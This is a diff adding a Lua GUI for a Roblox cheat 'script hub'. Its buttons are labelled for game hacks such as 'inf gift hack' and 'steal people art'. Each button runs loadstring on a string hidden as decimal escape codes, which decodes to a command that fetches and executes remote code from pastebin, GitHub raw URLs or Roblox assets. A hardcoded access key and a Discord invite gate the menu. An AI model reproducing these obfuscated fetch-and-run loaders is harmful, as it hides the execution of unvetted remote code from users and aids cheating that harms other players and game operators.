+shortcut_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+shortcut_6.TextScaled = true
+shortcut_6.TextSize = 14.000
+shortcut_6.TextWrapped = true
+
+saza.Name = "saza"
+saza.Parent = psx_2
+saza.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+saza.Position = UDim2.new(0, 0, 0, 64)
+saza.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+saza.Font = Enum.Font.GothamBold
+saza.Text = "saza hub v2"
+saza.TextColor3 = Color3.fromRGB(255, 255, 255)
+saza.TextScaled = true
+saza.TextSize = 14.000
+saza.TextWrapped = true
+saza.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\34\104\116\116\112\115\58\47\47\115\99\114\105\112\116\98\108\111\120\46\99\111\109\47\114\97\119\47\83\65\90\65\45\72\85\66\95\52\57\54\34\41\40\41\10")()
+end)
+
+bk.Name = "bk"
+bk.Parent = psx_2
+bk.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+bk.Position = UDim2.new(0, 0, 0, 127)
+bk.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+bk.Font = Enum.Font.GothamBold
+bk.Text = "bk script"
+bk.TextColor3 = Color3.fromRGB(255, 255, 255)
+bk.TextScaled = true
+bk.TextSize = 14.000
+bk.TextWrapped = true
+bk.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\76\65\67\75\71\65\77\69\82\49\50\50\49\47\80\101\116\45\83\105\109\117\108\97\116\111\114\45\88\47\109\97\105\110\47\66\75\37\50\48\80\101\116\46\108\117\97\34\41\41\40\41\10")()
+end)
+
+void.Name = "void"
+void.Parent = psx_2
+void.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+void.Position = UDim2.new(0, 0, 0, 179)
+void.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+void.Font = Enum.Font.GothamBold
+void.Text = "void hub"
+void.TextColor3 = Color3.fromRGB(255, 255, 255)
+void.TextScaled = true
+void.TextSize = 14.000
+void.TextWrapped = true
+void.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\105\110\100\53\57\54\47\86\111\105\100\72\117\98\47\109\97\105\110\47\87\105\110\105\110\103\68\101\100\105\121\34\44\32\116\114\117\101\41\41\40\41\10")()
+end)
+gift.Name = "gift"
+gift.Parent = psx_2
+gift.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+gift.Position = UDim2.new(0, 0, 0, 223)
+gift.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+gift.Font = Enum.Font.GothamBold
+gift.Text = "inf gift hack"
+gift.TextColor3 = Color3.fromRGB(255, 255, 255)
+gift.TextScaled = true
+gift.TextSize = 14.000
+gift.TextWrapped = true
+gift.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\69\113\113\113\54\114\75\112\34\41\41\40\41\10")()
+end)
+
+shark_2.Name = "shark"
+shark_2.Parent = scripts
+shark_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shark_2.LayoutOrder = 1
+shark_2.Position = UDim2.new(0.233521655, 0, 0.110726647, 0)
+shark_2.Size = UDim2.new(0.764595091, 0, 0.885813177, 0)
+shark_2.Visible = false
+
+shortcut_7.Name = "shortcut"
+shortcut_7.Parent = shark_2
+shortcut_7.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shortcut_7.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+shortcut_7.Font = Enum.Font.GothamBold
+shortcut_7.Text = "press K to hide ui"
+shortcut_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+shortcut_7.TextScaled = true
+shortcut_7.TextSize = 14.000
+shortcut_7.TextWrapped = true
+
+op_2.Name = "op"
+op_2.Parent = shark_2
+op_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+op_2.Position = UDim2.new(0, 0, 0, 64)
+op_2.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+op_2.Font = Enum.Font.GothamBold
+op_2.Text = "op shark bite script!"
+op_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+op_2.TextScaled = true
+op_2.TextSize = 14.000
+op_2.TextWrapped = true
+op_2.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\71\101\116\79\98\106\101\99\116\115\40\34\114\98\120\97\115\115\101\116\105\100\58\47\47\51\54\50\51\55\53\51\53\56\49\34\41\91\49\93\46\83\111\117\114\99\101\41\40\41\10")()
+end)
+
+bedwars_2.Name = "bedwars"
+bedwars_2.Parent = scripts
+bedwars_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+bedwars_2.LayoutOrder = 1
+bedwars_2.Position = UDim2.new(0.233521655, 0, 0.110726647, 0)
+bedwars_2.Size = UDim2.new(0.764595091, 0, 0.885813177, 0)
+bedwars_2.Visible = false
+
+shortcut_8.Name = "shortcut"
+shortcut_8.Parent = bedwars_2
+shortcut_8.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shortcut_8.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+shortcut_8.Font = Enum.Font.GothamBold
+shortcut_8.Text = "press K to hide ui"
+shortcut_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+shortcut_8.TextScaled = true
+shortcut_8.TextSize = 14.000
+shortcut_8.TextWrapped = true
+
+vape.Name = "vape"
+vape.Parent = bedwars_2
+vape.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+vape.Position = UDim2.new(0, 0, 0, 64)
+vape.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+vape.Font = Enum.Font.GothamBold
+vape.Text = "vape"
+vape.TextColor3 = Color3.fromRGB(255, 255, 255)
+vape.TextScaled = true
+vape.TextSize = 14.000
+vape.TextWrapped = true
+vape.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\55\71\114\97\110\100\68\97\100\80\71\78\47\86\97\112\101\86\52\70\111\114\82\111\98\108\111\120\47\109\97\105\110\47\78\101\119\77\97\105\110\83\99\114\105\112\116\46\108\117\97\34\44\32\116\114\117\101\41\41\40\41\10")()
+end)
+
+artist_2.Name = "artist"
+artist_2.Parent = scripts
+artist_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+artist_2.LayoutOrder = 1
+artist_2.Position = UDim2.new(0.233521655, 0, 0.110726647, 0)
+artist_2.Size = UDim2.new(0.764595091, 0, 0.885813177, 0)
+artist_2.Visible = false
+
+shortcut_9.Name = "shortcut"
+shortcut_9.Parent = artist_2
+shortcut_9.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shortcut_9.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+shortcut_9.Font = Enum.Font.GothamBold
+shortcut_9.Text = "press K to hide ui"
+shortcut_9.TextColor3 = Color3.fromRGB(255, 255, 255)
+shortcut_9.TextScaled = true
+shortcut_9.TextSize = 14.000
+shortcut_9.TextWrapped = true
+
+steal.Name = "steal"
+steal.Parent = artist_2
+steal.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+steal.Position = UDim2.new(0, 0, 0, 64)
+steal.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+steal.Font = Enum.Font.GothamBold
+steal.Text = "steal people art"
+steal.TextColor3 = Color3.fromRGB(255, 255, 255)
+steal.TextScaled = true
+steal.TextSize = 14.000
+steal.TextWrapped = true
+steal.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\51\75\103\87\78\77\98\78\34\41\41\40\41\10")()
+	end)
+
+bss_2.Name = "bss"
+bss_2.Parent = scripts
+bss_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+bss_2.LayoutOrder = 1
+bss_2.Position = UDim2.new(0.233521655, 0, 0.110726647, 0)
+bss_2.Size = UDim2.new(0.764595091, 0, 0.885813177, 0)
+bss_2.Visible = false
+
+shortcut_10.Name = "shortcut"
+shortcut_10.Parent = bss_2
+shortcut_10.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shortcut_10.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+shortcut_10.Font = Enum.Font.GothamBold
+shortcut_10.Text = "press K to hide ui"
+shortcut_10.TextColor3 = Color3.fromRGB(255, 255, 255)
+shortcut_10.TextScaled = true
+shortcut_10.TextSize = 14.000
+shortcut_10.TextWrapped = true
+
+kosmoc.Name = "kosmoc"
+kosmoc.Parent = bss_2
+kosmoc.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+kosmoc.Position = UDim2.new(0, 0, 0, 64)
+kosmoc.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+kosmoc.Font = Enum.Font.GothamBold
+kosmoc.Text = "kosmoc"
+kosmoc.TextColor3 = Color3.fromRGB(255, 255, 255)
+kosmoc.TextScaled = true
+kosmoc.TextSize = 14.000
+kosmoc.TextWrapped = true
+kosmoc.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\111\120\107\105\110\103\55\55\54\47\107\111\99\109\111\99\47\109\97\105\110\47\107\111\99\109\111\99\45\114\101\109\97\115\116\101\114\101\100\46\108\117\97\34\41\41\40\41\10")()
+end)
+
+pepsi.Name = "pepsi"
+pepsi.Parent = bss_2
+pepsi.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+pepsi.Position = UDim2.new(0, 0, 0, 126)
+pepsi.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+pepsi.Font = Enum.Font.GothamBold
+pepsi.Text = "pepsi swarm"
+pepsi.TextColor3 = Color3.fromRGB(255, 255, 255)
+pepsi.TextScaled = true
+pepsi.TextSize = 14.000
+pepsi.TextWrapped = true
+pepsi.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\71\101\116\79\98\106\101\99\116\115\40\34\114\98\120\97\115\115\101\116\105\100\58\47\47\52\51\56\52\49\48\51\57\56\56\34\41\91\48\88\49\93\46\83\111\117\114\99\101\41\40\34\80\101\112\115\105\32\83\119\97\114\109\34\41\10")()
+end)
+
+histy.Name = "histy"
+histy.Parent = bss_2
+histy.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+histy.Position = UDim2.new(0, 0, 0, 181)
+histy.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+histy.Font = Enum.Font.GothamBold
+histy.Text = "histy hub"
+histy.TextColor3 = Color3.fromRGB(255, 255, 255)
+histy.TextScaled = true
+histy.TextSize = 14.000
+histy.TextWrapped = true
+histy.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\72\105\115\116\111\114\105\97\48\48\48\49\50\47\72\73\83\84\79\82\73\65\72\85\66\47\109\97\105\110\47\66\83\83\37\50\48\70\82\69\69\34\41\41\40\41\10")()
+end)
+
+op_3.Name = "op"
+op_3.Parent = bss_2
+op_3.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+op_3.Position = UDim2.new(0, 0, 0, 225)
+op_3.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+op_3.Font = Enum.Font.GothamBold
+op_3.Text = "op bee swarm script"
+op_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+op_3.TextScaled = true
+op_3.TextSize = 14.000
+op_3.TextWrapped = true
+op_3.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\107\117\99\104\101\110\101\99\122\107\97\47\116\104\101\45\112\105\101\107\111\114\110\105\107\45\115\99\114\105\112\116\45\104\117\98\47\109\97\105\110\47\112\114\111\112\105\101\107\111\114\110\105\107\34\41\44\116\114\117\101\41\41\40\41\10")()
+end)
+
+TextButton.Parent = scripts
+TextButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+TextButton.Position = UDim2.new(0.935969889, 0, 0, 0)
+TextButton.Size = UDim2.new(0.0640301332, 0, 0.110726647, 0)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "X"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextWrapped = true
+TextButton.MouseButton1Click:Connect(function()
+	scripts:Destroy()
+	WHITELIST:Destroy()
+end)
+
+WHITELIST.Name = "WHITELIST"
+WHITELIST.Parent = piekornik
+WHITELIST.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+WHITELIST.Position = UDim2.new(0.312661499, 0, 0.309859157, 0)
+WHITELIST.Size = UDim2.new(0.296607524, 0, 0.320813805, 0)
+WHITELIST.Draggable = true
+WHITELIST.Active = true
+WHITELIST.Selectable = true
+
+
+TextLabel_5.Parent = WHITELIST
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.BorderSizePixel = 0
+TextLabel_5.Size = UDim2.new(1, 0, 0.209756076, 0)
+TextLabel_5.Font = Enum.Font.GothamBold
+TextLabel_5.Text = "Welcome, please type your key. You can find your key in the discord. https://discord.gg/wdBmzF5ajR"
+TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.TextScaled = true
+TextLabel_5.TextSize = 14.000
+TextLabel_5.TextWrapped = true
+
+TextBox.Parent = WHITELIST
+TextBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextBox.Position = UDim2.new(0, 0, 0.321951181, 0)
+TextBox.Size = UDim2.new(1, 0, 0.282926798, 0)
+TextBox.Font = Enum.Font.GothamBold
+TextBox.PlaceholderText = "Key here."
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextScaled = true
+TextBox.TextSize = 14.000
+TextBox.TextWrapped = true
+
+TextButton_2.Parent = WHITELIST
+TextButton_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_2.Position = UDim2.new(0, 0, 0.668292642, 0)
+TextButton_2.Size = UDim2.new(1, 0, 0.278048754, 0)
+TextButton_2.Font = Enum.Font.GothamBold
+TextButton_2.Text = "Submit."
+TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_2.TextScaled = true
+TextButton_2.TextSize = 14.000
+TextButton_2.TextWrapped = true
+TextButton_2.MouseButton1Click:Connect(function()
+if  TextBox.Text == "piekornikisdabest" then
+	WHITELIST.Visible = false
+	scripts.Visible = true
+	allow = true
+else
+	print("HEY! THIS KEY IS INCORRECT!")
+
+	end
+end)
+
+local HotKey = Enum.KeyCode.K -- Key to open Gui --
+local UIS = game:GetService("UserInputService")
+
+UIS.InputBegan:Connect(function(Key)
+	if allow == true then
+		if Key.KeyCode == HotKey then
+			scripts.Visible = not scripts.Visible
+		elseif allow == false then
+			print("lol u tried to bypass key")
+		end
+	end
+end)
